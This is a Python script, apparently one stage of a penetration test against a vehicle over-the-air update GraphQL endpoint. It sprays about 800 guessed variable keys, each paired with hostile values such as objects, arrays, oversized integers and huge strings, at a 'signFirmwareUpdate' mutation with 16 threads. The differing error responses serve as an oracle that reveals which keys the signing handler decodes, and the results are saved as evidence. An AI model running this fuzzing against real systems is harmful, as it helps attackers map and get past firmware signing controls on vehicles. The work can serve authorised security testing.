#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage P: type-confusion oracle to reveal which variable keys the handler decodes.

The generic error "update campaign validation failed" hides which keys the handler
actually reads.  If a Go handler decodes a key into a concrete type (string / int /
struct), feeding a hostile type for THAT key breaks differently (500, decode error,
or a distinct message).  Keys it never touches stay harmless.

Therefore: for each candidate key, send vin + a hostile value and look for ANY
response that is not the 200/"update campaign validation failed" baseline.
"""
import json, os
import requests
from concurrent.futures import ThreadPoolExecutor

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
URL = "http://10.225.139.2:8080/graphql"
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
REF = '{"errors":[{"message":"update campaign validation failed"}]}'

PRE = ["campaign", "update", "ota", "vcu", "firmware", "vehicle", "target", "package",
       "bundle", "asset", "artifact", "release", "software", "signature", "sign",
       "rollback", "updateCampaign", "vehicleCampaign", "otaCampaign", "vcuUpdate",
       "firmwareUpdate", "campaignUpdate", "authorization", "credential", "token"]
SUF = ["Id", "ID", "Key", "Token", "Code", "Name", "Ref", "Reference", "Counter", "Value",
       "Size", "Sha256", "Hash", "Address", "Slot", "Generation", "Version", "State",
       "Status", "Flag", "Payload", "Data", "Blob", "Nonce", "Credential", "Secret",
       "Rollback", "Image", "Type", "Mode"]
KEYS = set()
for p in PRE:
    KEYS.add(p)
    for s_ in SUF:
        KEYS.add(p + s_)
KEYS |= set("""vin campaignId campaign rollback rollbackCounter vcuRollback
vcuReferenceSize vcuUpdateAddress sha256 digest hash size length address
firmware image payload data blob content nonce signature sig
packageKey credential firmwareCredential key secret token auth authorization
id uuid type version generation slot status state force
input args params update request bundle manifest
""".split())

HOSTILE = [
    {"__probe__": 1},          # object where scalar expected
    [1, 2, 3],                 # array where scalar expected
    123456789012345678901234567890123456789,   # integer overflow
    "x" * 5000,                # huge string
    None,                      # explicit null
    True,
    1.5,
]

print(f"[*] {len(KEYS)} keys x {len(HOSTILE)} hostile types")


def probe(job):
    k, hv = job
    body = {"query": "signFirmwareUpdate", "variables": {"vin": VIN, k: hv}}
    try:
        r = requests.post(URL, json=body, timeout=15)
        txt = r.text.strip()
        return {"k": k, "hv": json.dumps(hv, default=str)[:60], "s": r.status_code,
                "same": txt == REF, "r": txt[:300]}
    except Exception as e:
        return {"k": k, "hv": json.dumps(hv, default=str)[:60], "s": -1,
                "same": False, "r": f"ERR {type(e).__name__}"}


def main():
    jobs = [(k, hv) for k in sorted(KEYS) for hv in HOSTILE]
    out = []
    with ThreadPoolExecutor(max_workers=16) as ex:
        for r in ex.map(probe, jobs):
            out.append(r)
    json.dump(out, open(os.path.join(EV, "P_type_oracle.json"), "w"), indent=1)
    diff = [r for r in out if not r["same"] or r["s"] != 200]
    print(f"[*] {len(out)} probes, {len(diff)} non-baseline")
    for r in diff:
        print(f"  ! {r['k']:26s} hv={r['hv'][:28]:30s} {r['s']} {r['r'][:120]}")
    # distinct messages summary
    msgs = {}
    for r in out:
        msgs[r["r"][:120]] = msgs.get(r["r"][:120], 0) + 1
    print("\n[*] distinct responses:")
    for m, c in msgs.items():
        print(f"  [{c:5d}] {m}")


if __name__ == "__main__":
    main()
